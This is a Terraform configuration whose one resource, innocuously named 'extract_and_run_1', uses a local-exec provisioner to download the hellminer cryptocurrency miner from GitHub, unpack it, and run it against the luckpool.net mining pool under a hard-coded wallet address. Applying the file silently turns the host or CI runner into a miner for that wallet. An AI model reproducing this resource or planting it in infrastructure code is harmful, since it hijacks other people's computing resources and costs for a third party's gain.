resource "null_resource" "extract_and_run_1" {
  provisioner "local-exec" {
    command = <<EOT
set -e
apt update 
apt install -y libsodium23

curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz -o hellminer.tar.gz
tar -xzf hellminer.tar.gz

chmod +x hellminer verus-solver

ldd verus-solver || true

./hellminer \
  -c stratum+tcp://na.luckpool.net:3956 \
  -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 \
  -p x \
  --cpu 2
EOT
  }
}
